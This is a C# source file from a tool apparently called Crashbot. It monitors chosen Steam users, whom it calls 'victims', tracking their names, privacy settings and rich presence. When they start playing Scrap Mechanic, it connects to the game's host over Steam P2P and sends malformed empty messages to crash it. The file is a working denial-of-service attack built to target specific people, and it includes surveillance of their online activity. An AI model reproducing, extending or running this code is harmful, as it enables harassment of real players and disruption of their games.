using Steamworks;
using System.Collections.Concurrent;
using System.Diagnostics;
using System.Security.Cryptography;
using System.Text;
using static Crashbot.Victim;

namespace Crashbot
{
    public class SteamInterface
    {
        private static readonly SteamNetworkingConfigValue_t[] LongTimeoutOptions = [
            new SteamNetworkingConfigValue_t
            {
                m_eDataType = ESteamNetworkingConfigDataType.k_ESteamNetworkingConfig_Int32,
                m_eValue = ESteamNetworkingConfigValue.k_ESteamNetworkingConfig_TimeoutConnected,
                m_val = new SteamNetworkingConfigValue_t.OptionValue { m_int32 = 500 }
            },
            new SteamNetworkingConfigValue_t
            {
                m_eDataType = ESteamNetworkingConfigDataType.k_ESteamNetworkingConfig_Int32,
                m_eValue = ESteamNetworkingConfigValue.k_ESteamNetworkingConfig_TimeoutInitial,
                m_val = new SteamNetworkingConfigValue_t.OptionValue { m_int32 = Int32.MaxValue }
            }
        ];

        private static readonly SteamNetworkingConfigValue_t[] ConnectionTimeoutOptions = [
            new SteamNetworkingConfigValue_t
            {
                m_eDataType = ESteamNetworkingConfigDataType.k_ESteamNetworkingConfig_Int32,
                m_eValue = ESteamNetworkingConfigValue.k_ESteamNetworkingConfig_TimeoutInitial,
                m_val = new SteamNetworkingConfigValue_t.OptionValue { m_int32 = 800 }
            }
        ];

        private const int FUN_TIME = 7;
        private const int REQUEST_TIMEOUT = 1000;
        private readonly InterfaceMode OperationMode;
        private readonly SteamThread SteamThread;
        private SteamInterface(InterfaceMode operation) 
        { 
            this.OperationMode = operation;
            this.SteamThread = new SteamThread(operation);
        }

        private static readonly ConcurrentBag<Task<SteamInterface>> steamInterfaceThreads = [];
        private readonly ConcurrentDictionary<CSteamID, Victim> victims = [];

        /// <summary>
        /// Creates a new steam interface in a detached thread.
        /// </summary>
        /// <returns></returns>
        public static SteamInterface NewAsyncInterface()
            => new(InterfaceMode.Asyncronous);

        /// <summary>
        /// Creates a new steam interface for use in the current thread.
        /// </summary>
        /// <returns></returns>
        public static SteamInterface NewSyncInterface()
            => new(InterfaceMode.Syncronous);



        public bool AddNewVictim(Victim victim)
            => this.victims.TryAdd(victim.SteamId, victim);
        
        public void GetVictimRichPresence(Victim victim)
            => this.GetVictimRichPresence(victim.SteamId);

        public string LoadVictimName(Victim victim)
        {
            string name = this.LoadVictimName(victim.SteamId);
            victim.OnNameLoaded(name);
            return name;
        }

        public void CrashVictimWhenReady(Victim v)
        {
            if (this.victims.TryGetValue(v.SteamId, out var victim))
            {
                AutoResetEvent Step = new(false);

                void onSettingsLoaded(PrivacyState _)
                {
                    Step.Set();
                    victim.PrivacySettingsChanged -= onSettingsLoaded;
                };
                victim.PrivacySettingsChanged += onSettingsLoaded;

                victim.StartTracking();
                string name = this.LoadVictimName(victim);
                Console.WriteLine($"Targeting '{name}'", Verbosity.Normal);

                Step.WaitOne();
                CancellationTokenSource interuptSource = new();

                Console.WriteLine($"Now watching {name} ({v.SteamId})...", Verbosity.Normal);

                if (victim.PrivacySettings == PrivacyState.Private)
                {
                    // Direct connection, ocasionaly check if the profile is public
                    return;
                }

                CancellationTokenSource previousSource = interuptSource;
                // wait for RP and fast track
                void onGameChange(bool isPlaying)
                {
                    if (isPlaying)
                    {
                        previousSource.Cancel();
                        previousSource.Token.WaitHandle.WaitOne(1000);

                        interuptSource = new();
                        this.CrashClientAsync(victim, interuptSource);
                        previousSource = interuptSource;
                    }
                };

                victim.GetRichPresence += (_, _) => this.GetVictimRichPresence(victim);
                victim.StartCollectRichPresence();

                victim.GameStateChanged += onGameChange;
                victim.FasterTracking(new CancellationTokenSource().Token);

                onGameChange(victim.IsPlayingScrapMechanic);
            }
        }

        private void CrashClientAsync(Victim mega_victim, CancellationTokenSource interuptSource)
            => Task.Run(() => this.CrashClient(mega_victim, interuptSource));

        private void CrashClient(Victim mega_victim, CancellationTokenSource interuptSource)
        {
            if (!mega_victim.IsCrashing)
            {
                mega_victim.IsCrashing = true;

                SteamNetworkingIdentity remoteIdentity = new();
                remoteIdentity.SetSteamID(mega_victim.HostSteamId);

                Console.WriteLine($"Preparing to crash host {mega_victim.HostSteamId} for victim {mega_victim.SteamId}", Verbosity.Verbose);
                var (cx, ix) =
                    this.SteamThread.ConnectP2P(ref remoteIdentity, 0, SteamInterface.LongTimeoutOptions.Length, SteamInterface.LongTimeoutOptions, interuptSource.Token);

                if (cx is null || ix is null)
                {
                    mega_victim.IsCrashing = false;
                    Console.WriteLine($"Exiting early, likely due to token cancelation: {interuptSource.IsCancellationRequested}", Verbosity.Debug);
                    return;
                }

                SteamNetConnectionInfo_t info = ix.Value;
                HSteamNetConnection conn = cx.Value;

                Stopwatch timeGate = Stopwatch.StartNew();
                while (true)
                {
                    int messageCount = this.SteamThread.Get(SteamNetworkingSockets.ReceiveMessagesOnConnection, conn, new IntPtr[1], 1);

                    if (messageCount > 0 || timeGate.ElapsedMilliseconds > 1000)
                    {
                        for (int i = 0; i < FUN_TIME; i++)
                        {
                            this.SteamThread.SendMessageToConnection(conn, 0, 0, 0);
                            this.SteamThread.Get(SteamNetworkingSockets.FlushMessagesOnConnection, conn);
                            Task.Delay(20).Wait();
                        }
                        Task.Delay(500).Wait();
                        break;
                    }
                }

                Console.WriteLine($"Crashed host ({mega_victim.HostSteamId}) for victim ({mega_victim.SteamId})", Verbosity.Verbose);
               
                mega_victim.IsCrashing = false;
                mega_victim.OnRichPresenceUpdate([]);
            }
        }

        private string LoadVictimName(CSteamID steamid)
        {
            bool infoIsPreLoaded = this.SteamThread.Get(SteamFriends.RequestUserInformation, steamid, true);

            if (!infoIsPreLoaded)
            {
                AutoResetEvent nameLoaded = new(false);
                Callback<PersonaStateChange_t>.Create(_ => nameLoaded.Set());
                nameLoaded.WaitOne(REQUEST_TIMEOUT);
            }

            return this.SteamThread.Get(SteamFriends.GetFriendPersonaName, steamid)!;
        }

        private void GetVictimRichPresence(CSteamID steamid)
        {
            Callback<FriendRichPresenceUpdate_t>.Create(result =>
            {
                if (this.victims.TryGetValue(result.m_steamIDFriend, out var victim))
                {
                    var currentRP = this.LoadUserRP(victim.SteamId);
                    victim.OnRichPresenceUpdate(currentRP);
                }
            });

            this.SteamThread.Run(SteamFriends.RequestFriendRichPresence, steamid);
        }

        private Dictionary<string, string> LoadUserRP(CSteamID user)
        {
            Dictionary<string, string> richPresence = [];

            int keyCount = this.SteamThread.Get(SteamFriends.GetFriendRichPresenceKeyCount, user);
            if (keyCount > 0)
            {
                for (int i = 0; i < keyCount; i++)
                {
                    string key = this.SteamThread.Get(SteamFriends.GetFriendRichPresenceKeyByIndex, user, i)!;
                    string value = this.SteamThread.Get(SteamFriends.GetFriendRichPresence, user, key)!;
                    richPresence.Add(key, value);
                }
            }

            return richPresence;
        }

        private static ulong HashRichPresence(string richPresence)
        {
            byte[] hash = SHA512.HashData(Encoding.UTF8.GetBytes(richPresence));
            return BitConverter.ToUInt64(hash, 0);
        }

        public void WaitUntilSteamReady()
        {
            while(!this.SteamThread.SteamIsReady)
                Task.Delay(1).Wait();
        }
    }
}
